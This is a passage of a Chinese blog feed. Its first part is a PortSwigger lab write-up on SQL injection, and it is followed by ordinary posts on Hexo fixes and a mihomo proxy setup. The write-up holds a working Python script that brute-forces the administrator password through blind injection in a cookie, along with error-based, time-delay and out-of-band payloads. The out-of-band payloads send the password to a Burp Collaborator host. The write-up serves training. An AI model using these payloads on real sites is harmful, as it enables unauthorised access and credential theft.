<p>在获得某用户密码的时候，本题只需要我们获得<code>administrator</code>的密码就可以了，考虑到密码又多又长，逐个爆破会消耗大量的时间，因此我编写了Python脚本单独对<code>administrator</code>用户进行爆破，脚本已经很自动化了，只需要把url和TrackingId换成子自己的就可以了。脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求的URL</span></span><br><span class="line">url = <span class="string">&quot;https://0a00000a04a6557481de208a005400a1.web-security-academy.net/filter?category=Pets&quot;</span></span><br><span class="line">username = <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">tablename = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">method = <span class="string">&#x27;get&#x27;</span></span><br><span class="line">sleep_time = <span class="number">0</span></span><br><span class="line">TrackingId = <span class="string">&#x27;brVO8ubeFsIHT9hw&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie获取密码长度get_password_length_by_user</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_length_by_user</span>(<span class="params">url,username,tablename,intject_id</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;intject_id&#125;</span>&#x27; and (select &#x27;a&#x27; from users where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27; AND LENGTH(password)&gt;<span class="subst">&#123;i&#125;</span>)=&#x27;a&#x27; --+&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">        sleep(sleep_time)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password_length=i</span><br><span class="line">            <span class="keyword">return</span> password_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破某一用户名密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_by_user</span>(<span class="params">url,username,tablename,inject_id</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    password_length=get_password_length_by_user(url,username,tablename,inject_id)</span><br><span class="line">    <span class="keyword">for</span> password_index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, password_length+<span class="number">1</span>):</span><br><span class="line">        ascii_low = <span class="number">32</span></span><br><span class="line">        ascii_high = <span class="number">128</span></span><br><span class="line">        ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> ascii_low &lt; ascii_high:</span><br><span class="line">            cookies = &#123;</span><br><span class="line">                <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;inject_id&#125;</span>&#x27; and ascii(substr((select password from <span class="subst">&#123;tablename&#125;</span> where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27;),<span class="subst">&#123;password_index&#125;</span>,1)) &gt; <span class="subst">&#123;ascii_mid&#125;</span>--+;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">            sleep(sleep_time)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                ascii_low=ascii_mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ascii_high = ascii_mid</span><br><span class="line">            ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        result+=<span class="built_in">chr</span>(ascii_mid)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">password=get_password_by_user( url,username,tablename,TrackingId)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
<p><font class="notice">其实，本题在爆破数据表时，也可以使用Python单独对表名中含有<code>user</code>的表进行爆破，但考虑实际情况，把所有的表名爆破出，容易获得更多的信息</font></p>
<h2 id="带有条件错误的盲-SQL-注入">带有条件错误的盲 SQL 注入</h2>
<p>Substring用法：你可以从指定偏移量开始，提取具有指定长度的字符串部分。需要注意的是，偏移量索引是从1开始计数的。以下每个表达式都将返回字符串 <code>ba</code>。</p>
<table>
<thead>
<tr>
<th style="text-align:left">数据库</th>
<th style="text-align:left">语法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left"><code>SUBSTR('foobar', 4, 2)</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
</tbody>
</table>
<p>跟上一题是非常类似的。讲一下原理</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、添加单引号收到错误</span><br><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2、添加两个单引号错误消失</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;&#x27;</span></span><br><span class="line"><span class="string">3、确认是查询错误而不是其他类型错误。下列语句表明目标为Oracle 数据库</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;（错误）</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> dual)<span class="operator">||</span><span class="string">&#x27;（正确）</span></span><br><span class="line"><span class="string">4、验证users表存在</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> ROWNUM <span class="operator">=</span> <span class="number">1</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">5、验证用户administrator存在</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">6、爆破密码长度</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> LENGTH(password)<span class="operator">&gt;</span>§a§ <span class="keyword">THEN</span> to_char(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">7、爆破密码</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> SUBSTR(password,§b§,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;§a§&#x27;</span> <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<p><img src="/posts/3b7c6011//image-20250316173050195.png" alt="image-20250316173050195"></p>
<h2 id="基于可见错误的-SQL-注入-bool型SQL注入">基于可见错误的 SQL 注入(bool型SQL注入)</h2>
<p>错误会返回到客户端</p>
<p><img src="/posts/3b7c6011//image-20250316181656140.png" alt="image-20250316181656140"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、天加一个引号，可以在web页面看到报错，并看到自己的cookie</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2、添加注释符不再报错</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="number">3</span>、添加错误的语句观察返回内容</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27; AND CAST((SELECT 1) AS int)--</span></span><br><span class="line"><span class="string">4、使用正确语句错误消失</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br><span class="line"><span class="number">5</span>、泄露用户</span><br><span class="line">TrackingId<span class="operator">=</span>xxxx<span class="string">&#x27; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</span></span><br><span class="line"><span class="string">6、泄露密码</span></span><br><span class="line"><span class="string">TrackingId=&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p>我试了下面这个注入语句，但是没有得到想要的结果。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="string">&#x27; AND 1=CAST((SELECT password FROM users where username=&#x27;</span>administrator<span class="string">&#x27;) AS int)--</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/3b7c6011//image-20250316184013533.png" alt="image-20250316184013533"></p>
<h2 id="带有时间延迟和信息检索的盲-SQL-注入">带有时间延迟和信息检索的盲 SQL 注入</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>延迟<span class="number">10</span>秒</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</span></span><br><span class="line"><span class="string">2.不延时</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="comment">--</span></span><br><span class="line"><span class="number">3.</span>延时，说明有administrator用户</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br><span class="line"><span class="string">4.延时，说明密码长度为20</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span><span class="operator">+</span><span class="keyword">AND</span><span class="operator">+</span>LENGTH(password)<span class="operator">=</span><span class="number">20</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users<span class="comment">--</span></span><br><span class="line"><span class="number">5.</span>bp爆破</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;+AND+SUBSTRING(password,§b§,1)=&#x27;</span>§a§<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br></pre></td></tr></table></figure>
<h2 id="带外交互的盲-SQL-注入">带外交互的盲 SQL 注入</h2>
<p><img src="/posts/3b7c6011//image-20250320124609391.png" alt="image-20250320124609391"></p>
<p><a href="http://k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com">k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: TrackingId<span class="operator">=</span>Mf3GZbtHdrUPYCyR<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--; session=7HQmzle2kv8m9yAyiZADwZ8B64e6hGQp</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/3b7c6011//image-20250320124746996.png" alt="image-20250320124746996"></p>
<h2 id="SQL盲注与带外数据渗出">SQL盲注与带外数据渗出</h2>
<p>跟上边类似的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/3b7c6011//image-20250320142450030.png" alt="image-20250320142450030"></p>
<h2 id="通过-XML-编码绕过过滤器的-SQL-注入XML绕过注入">通过 XML 编码绕过过滤器的 SQL 注入XML绕过注入</h2>
<p><img src="/posts/3b7c6011//image-20250320153828228.png" alt="image-20250320153828228"></p>
<p><img src="/posts/3b7c6011//image-20250320153954704.png" alt="image-20250320153954704"></p>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>靶场练习</category>
        <category>PortSwigger靶场</category>
      </categories>
      <tags>
        <tag>PortSwigger靶场</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>【Hexo】使用中的总结</title>
    <url>/posts/8071f3a9/</url>
    <content><![CDATA[<p>本文记录在使用hexo过程中遇到的一些问题，持续更新</p>
<span id="more"></span>
<h2 id="带空格的标题">带空格的标题</h2>
<p>带空格的标题需要用双引号<code>“标  题”</code>引起来，不然文件和标题的命名会发生错误。</p>
<p><img src="/posts/8071f3a9//image-20250305142442398.png" alt="image-20250305142442398"></p>
<h2 id="标签未闭合">标签未闭合</h2>
<p>错误信息显示“unexpected end of file”，通常意味着模板中有未闭合的标签或语法错误，但也有其他可能。</p>
<p><img src="/posts/8071f3a9//image-20250507115534543.png" alt="image-20250507115534543"></p>
<h2 id="取消图片名字">取消图片名字</h2>
<p><img src="/posts/8071f3a9//111.png" alt="111"></p>
<p>我使用Typora编写博客，复制粘贴图像的时候会自动生成名字，但是我觉得这样并不美观，因此我想让我的博客不再显示名称。由于我已经写了很多的博客，所以单纯的修改Typora会使我之前的图片依然显示名字，因此我考虑修改我的主题配置。</p>
<p>这个问题也花费了我不短的时间，主要明明可以简单的在主题的配置文件里添加<code>head: source/_data/head.css</code> 但是我这么做以后，始终不能成功。我的head.css文件并没有加载。网络适配器里搜索不到head.css，并且在我博客的右上角出现 <code>[object Promise]</code> 字符。</p>
<p>因此我直接修改了主题模板强制引入。</p>
<ol>
<li class="lvl-3">
<p>打开主题的 <code>head.swig</code> 文件（路径：<code>themes/next/layout/_partials/head.swig</code>）。</p>
</li>
<li class="lvl-3">
<p>在文件末尾添加以下代码：</p>
</li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;# 手动引入自定义 CSS #&#125;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;/css/head<span class="selector-class">.css</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>将 <code>head.css</code> 移动到 Hexo 的 <code>source/css/</code> 目录：</p>
</li>
</ol>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">博客根目录/</span><br><span class="line">├─ source/</span><br><span class="line">│  └─ css/</span><br><span class="line">│     └─ head.css   &lt;<span class="comment">-- 移动到此目录</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>清理缓存并重新生成：<code>hexo clean &amp;&amp; hexo g</code></p>
</li>
</ol>
<h2 id="新生成的博客没有序列化">新生成的博客没有序列化</h2>
<p>每次生成新博客之后要先执行一下<code>hexo cl &amp;&amp; hexo g</code> 才会生成<code>abbrlink</code>。</p>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Hexo</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】mihomo代理</title>
    <url>/posts/f4ca21fa/</url>
    <content><![CDATA[<h2 id="mihomo">mihomo</h2>
<p>阿里云服务器每次访问外网都超时，之前安装工具都是先下载到本地再上传到服务器。前些天复现漏洞下个镜像拖来拖去的，实在是忍无可忍了。网上看了各种文章，尝试了各种方法，最后使用了mihomo代理成功访问外网。</p>
<span id="more"></span>
<h3 id="mihomo安装">mihomo安装</h3>
<ol>
<li class="lvl-3">
<p>mihomo下载，github地址：<a href="https://github.com/MetaCubeX/mihomo">https://github.com/MetaCubeX/mihomo</a></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 因为没法访问外网，要先下载到本地，再传到服务器。</span><br><span class="line">2. gzip -d mihomo.gz          <span class="comment">#解压缩</span></span><br><span class="line">3. <span class="built_in">mv</span> mihomo /usr/local/bin/mihomo   <span class="comment">#将 mihomo 移动到 /usr/local/bin/ 目录：</span></span><br><span class="line">4. <span class="built_in">sudo</span> <span class="built_in">chmod</span> +x /usr/local/bin/mihomo  <span class="comment">#设置可执行权限</span></span><br></pre></td></tr></table></figure>
<p>经过上述步骤以后，要在为mihomo添加配置文件config.yaml和Country.mmdb。Country.mmdb我是在在github上找的。</p>
<p>2.创建 systemd 配置文件 <code>/etc/systemd/system/mihomo.service</code>，并添加如下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=mihomo Daemon, Another Clash Kernel.</span><br><span class="line">After=network.target NetworkManager.service systemd-networkd.service iwd.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">LimitNPROC=500</span><br><span class="line">LimitNOFILE=1000000</span><br><span class="line">CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_DAC_OVERRIDE</span><br><span class="line">AmbientCapabilities=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_DAC_OVERRIDE</span><br><span class="line">Restart=always</span><br><span class="line">ExecStartPre=/usr/bin/sleep 1s</span><br><span class="line">ExecStart=/usr/local/bin/mihomo -d /etc/mihomo</span><br><span class="line">ExecReload=/bin/kill -HUP <span class="variable">$MAINPID</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>创建配置文件。mihomo和clash meta用的是相同的内核，因此这个配置文件和我本地Windows系统用的clash meta是一样的。我创建的配置文件在/etc/mihomo/config.yaml。但是这个配置文件需要按个性修改，我会在后文介绍他的更全面的功能，部分细节如下：</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[11:42:20 root@rocky95 ~]# <span class="built_in">head</span> -n 20 /etc/mihomo/config.yaml </span><br><span class="line">mixed-port: 7890</span><br><span class="line">allow-lan: <span class="literal">true</span></span><br><span class="line">bind-address: <span class="string">&#x27;*&#x27;</span></span><br><span class="line">mode: rule</span><br><span class="line">log-level: info</span><br><span class="line">external-controller: <span class="string">&#x27;127.0.0.1:9090&#x27;</span></span><br><span class="line">unified-delay: <span class="literal">true</span></span><br><span class="line">tcp-concurrent: <span class="literal">true</span></span><br><span class="line">dns:</span><br><span class="line">........</span><br><span class="line">proxies:</span><br><span class="line">.........</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>重启systemd</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>启用 mihomo 服务：</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> mihomo</span><br></pre></td></tr></table></figure>
<h3 id="mihomo使用">mihomo使用</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 启用 mihomo 服务：</span><br><span class="line">systemctl <span class="built_in">enable</span> mihomo</span><br><span class="line">2. 立即启动 mihomo:</span><br><span class="line">systemctl start mihomo</span><br><span class="line">3. 重新加载mihomo</span><br><span class="line">systemctl reload mihomo</span><br><span class="line">4. 检查 mihomo 的运行状况</span><br><span class="line">systemctl status mihomo</span><br><span class="line">5. 检查 mihomo 的运行日志</span><br><span class="line">journalctl -u mihomo -o <span class="built_in">cat</span> -e</span><br><span class="line">或</span><br><span class="line">journalctl -u mihomo -o <span class="built_in">cat</span> -f</span><br><span class="line">6. 关闭 mihomo 服务：</span><br><span class="line">systemctl <span class="built_in">disable</span> mihomo</span><br></pre></td></tr></table></figure>
<h2 id="为Linux设置代理">为Linux设置代理</h2>
<h3 id="临时启用和关闭代理">临时启用和关闭代理</h3>
<p>在使用Linux时，临时启用代理的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://username:password@ip:port</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://username:password@ip:port</span><br></pre></td></tr></table></figure>
<p>ip和port为你的代理服务器的ip以及开放的端口。</p>
<p>取消代理：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unset</span> http_proxy</span><br><span class="line"><span class="built_in">unset</span> https_proxy</span><br></pre></td></tr></table></figure>
<h3 id="永久全局代理">永久全局代理</h3>
<p>永久全局代理将临时启用代理的命令添加至系统配置文件中，source刷新shell环境即可。</p>
<ol>
<li class="lvl-3">
<p>修改系统配置文件</p>
</li>
</ol>
<p><code>vim /etc/profile</code> 添加以下代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://username:password@ip:port</span><br><span class="line"><span class="built_in">export</span> https_proxy=https://username:password@ip:port</span><br></pre></td></tr></table></figure>
<p><code>source /etc/profile</code> 是配置文件生效</p>
<h3 id="设置代理的基本语法">设置代理的基本语法</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`环境变量</span><br><span class="line">http_proxy:为http变量设置代理;默认不填开头以http协议传输</span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">`以下是常见的基本语法</span><br><span class="line">http_proxy=ip:port</span><br><span class="line">http_proxy=http://ip:port</span><br><span class="line">http_proxy=socks4://ip:port</span><br><span class="line">http_proxy=socks5://ip:port</span><br><span class="line">​</span><br><span class="line">`如果不想设置白名单,也可以使用用户名和密码进行验证</span><br><span class="line">http_proxy=http://username:password@ip:port</span><br><span class="line">http_proxy=http://username:password@ip:port</span><br><span class="line">​</span><br><span class="line">https_proxy:为https设置代理</span><br><span class="line">ftp_proxy:为ftp设置代理</span><br><span class="line">all_proxy:全部变量设置代理,设置了这个的时候上面不需要设置</span><br><span class="line">no_proxy:无需代理的主机或域名;可以使用通配符,多个时使用<span class="string">&quot;,&quot;</span>号分隔</span><br><span class="line"><span class="comment"># 示例：</span></span><br><span class="line">*.aiezu.com,10.*.*.*,192.168.*.*</span><br><span class="line">*.<span class="built_in">local</span>,localhost,127.0.0.1</span><br></pre></td></tr></table></figure>
<h3 id="部署Web控制面板">部署Web控制面板</h3>
<p>部署好了mihomo代理以后，在虚拟机上切换节点、重载配置等较为不便，可以为mihomo部署控制面板，方便管理。但如果服务器暴露在公网中，使用Web面板会很不安全。因此把Web面板设置成只能本地发开就可以了，我们可以通过SSH协议链接服务器再打开Web面板。</p>
<ol>
<li class="lvl-3">
<p>在config.yaml中添加或修改如下配置：</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">external-controller: <span class="string">&#x27;127.0.0.1:7891&#x27;</span>#0.0.0.0所有ip都可访问</span><br><span class="line">secret: <span class="string">&quot;*******&quot;</span>  <span class="comment">#设置密码更加保险</span></span><br><span class="line">external-ui: /etc/mihomo/ui <span class="comment">#web页面存放地址</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>从github下载</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> git <span class="built_in">clone</span> https://github.com/metacubex/metacubexd.git -b gh-pages /etc/mihomo/ui</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>重启mihomo服务</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart mihomo</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>远程连接访问</p>
</li>
</ol>
<figure class="highlight pf"><table><tr><td class="code"><pre><span class="line"><span class="comment">#首先通过SSH连接我们的服务器</span></span><br><span class="line">ssh -L <span class="keyword">port</span>:localhost:<span class="keyword">port</span> <span class="keyword">user</span>@ip</span><br><span class="line"><span class="comment">#然后在浏览器打开 http://localhost:7891/ui/ 就可以啦</span></span><br></pre></td></tr></table></figure>
<p>如果<code>external-controller</code>设置成 <code>0.0.0.0</code> 就直接访问<a href="http://ip">http://ip</a>:port/ui（不建议）</p>
<h2 id="docker使用网络代理">docker使用网络代理</h2>
<p>Docker守护进程默认不会使用系统环境变量中的代理设置，需要单独配置。</p>
<p>gitbook上有一篇docker的详解：<a href="https://yeasy.gitbook.io/docker_practice/">Docker — 从入门到实践</a></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>为 docker 创建配置文件夹。</p>
</li>
</ul>
